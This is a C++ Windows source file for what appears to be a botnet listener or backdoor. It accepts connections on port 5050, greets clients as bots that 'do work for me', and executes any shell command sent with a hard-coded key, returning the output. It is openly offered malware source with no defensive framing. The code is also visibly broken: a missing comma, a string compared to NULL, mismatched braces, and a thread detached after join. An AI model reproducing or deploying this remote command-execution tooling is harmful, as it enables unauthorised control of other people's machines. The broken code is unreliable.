#include <iostream>
#include <ws2tcpip.h>
#include <string>
#include <sstream>
#include <thread>

#include <stdexcept>
#include <stdio.h>

#include <bits/stdc++.h>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

string strings[50];

string exec(string command) {
   char buffer[128];
   string result = "";

   // Open pipe to file
   FILE* pipe = popen(command.c_str(), "r");
   if (!pipe) {
      return "popen failed!";
   }

   // read till end of process:
   while (!feof(pipe)) {

      // use buffer to read and add to result
      if (fgets(buffer, 128, pipe) != NULL)
         result += buffer;
   }

   pclose(pipe);
   return result;
}

int len(string str) {  
    int length = 0;  
    for (int i = 0; str[i] != '\0'; i++)  
    {  
        length++;  
          
    }  
    return length;     
}

void split (string str, char seperator)  
{  
    int currIndex = 0, i = 0;  
    int startIndex = 0, endIndex = 0;  
    while (i <= len(str))  
    {  
        if (str[i] == seperator || i == len(str))  
        {  
            endIndex = i;  
            string subStr = "";  
            subStr.append(str, startIndex, endIndex - startIndex);  
            strings[currIndex] = subStr;  
            currIndex += 1;  
            startIndex = endIndex + 1;  
        }  
        i++;  
        }     
}

int botCLI() {
    // Create socket 
    SOCKET listn = socket(AF_INET, SOCK_STREAM, 0);
    if (listn == INVALID_SOCKET) {
        puts("* Cannot create socket! Quitting.");
        return 1;
    }
    puts("* Socket created... ");


    // Bind the ipaddress
    sockaddr_in his;
    his.sin_family = AF_INET;
    his.sin_port = htons( 5050 );
    his.sin_addr.S_un.S_addr = INADDR_ANY;

    bind(listn, (sockaddr*)&his, sizeof(his));
    
    // Telling winsock2 the socket for listening
    listen(listn, SOMAXCONN);

    fd_set master;
    FD_ZERO(&master);

    FD_SET(listn, &master);

    bool onRun = true;
    string sysKey = "161718";

    while (onRun) {
        fd_set copy = master;
        int sockcount = select(0, &copy, nullptr, nullptr, nullptr);

        for (int i = 0; i < sockcount; i++) {
            SOCKET sock = copy.fd_array[i];
            if (sock == listn) {
                SOCKET client = accept(listn, nullptr, nullptr);
                FD_SET(client, &master);
                string welcomeMsg = "Welcome to network of bots, you are one of the bot. You do work for me! @Cyber2f08";
                puts("* A bot has been connected");
                send(client, welcomeMsg.c_str(), welcomeMsg.size() + 1, 0);
            } else {
                char buf[4096];
                ZeroMemory(buf, 4096);
                int bytesIn = recv(sock, buf, 4096, 0);
                if (bytesIn <= 0) {
                    closesocket(sock);
                    FD_CLR(sock, &master);
                } else {
                    char seperator = ' ';
                    split(string(buf), seperator);
                    if (strings[0] == "CMD") {
                        if (strings[1] == sysKey) {
                            puts("* Someone has been authorized to run some commands...");
                            if(strings[2] != NULL) {
                                string docmd = exec(strings[2]);
                                send(sock, docmd.c_str() docmd.size() + 1, 0);
                            }
                        }
                    }

                    }
                    cout << "BOT # " << sock << ": " << buf << "\r\n";

                    if (buf[0] == '\\') {
                        string cmd = string(buf, bytesIn);
                        if (cmd == "\\quit") {
                            onRun = false;
                            break;
                        }
                        continue;
                    }

                    for (int i = 0; i < master.fd_count; i++) {
                        SOCKET outSock = master.fd_array[i];
                        if (outSock != listn && outSock != sock) {
                            ostringstream ss;
                            ss << "SOCKET #" << sock << ": " << buf << "\r\n";
                            string strOut = ss.str();

                            send(outSock, strOut.c_str(), strOut.size() + 1, 0);
                        }
                    }
                }
            }
        }
        
    FD_CLR(listn, &master);
    string msg = "Server is shutting down. Goodbye soldiers\r\n";

    while (master.fd_count > 0) {
        SOCKET sock = master.fd_array[0];
        send(sock, msg.c_str(), msg.size() + 1, 0);
        FD_CLR(sock, &master);
        closesocket(sock);
    }

    WSACleanup();
}

int main() {
    system("cls");
    WSADATA wsData;
    WORD ver = MAKEWORD(2, 2);

    int wsOk = WSAStartup(ver, &wsData);
    if (wsOk != 0) {
        puts("* Cannot initialize winsock! Quitting.");
        return 1;
    }
    puts("* Winsock2 Initialized.. ");

    thread t1(botCLI);
    t1.join();
    t1.detach();

    return 0;
} 

